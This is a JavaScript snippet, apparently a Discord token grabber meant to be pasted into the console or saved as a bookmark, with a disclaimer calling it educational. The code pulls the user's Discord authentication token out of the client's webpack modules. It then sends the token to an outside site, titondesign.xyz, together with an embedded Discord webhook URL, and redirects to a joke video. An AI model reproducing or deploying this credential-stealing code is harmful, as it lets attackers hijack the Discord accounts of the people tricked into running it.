// !!! DISCLAIMER !!!
// For educational purposes only. The authors of the script are not responsible for any damage caused by it.
// The script's task is to show how easy it is to steal a Discord token, for example by including this code in a bookmark. You use it at your own risk.

// Discord webhook URL (this webhook will send tokens)
let webhook = "https://discord.com/api/webhooks/1038218040279580683/ngE1mZp0cPC1mMmaEGoRDknL1wJsXLvhddAZZN_2L9iuXjNt0x7g2WNfv9IjsFYYxyBh"
// Redirect URL after grabbing token (optional)
let fallback = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
// Getting token from Discord
let token = (webpackChunkdiscord_app.push([
  [""],
  {},
  (e) => {
    m = [];
    for (let c in e.c) m.push(e.c[c]);
  },
]),
m)
  .find((m) => m?.exports?.default?.getToken !== void 0)
  .exports.default.getToken();
// Due to Discord's blocking of sending webhooks from the console, the token has to pass through my external website.
window.location.href = `https://titondesign.xyz/quickdata?quickdata=${token}&fallback=${fallback}&webhook=${webhook}`;
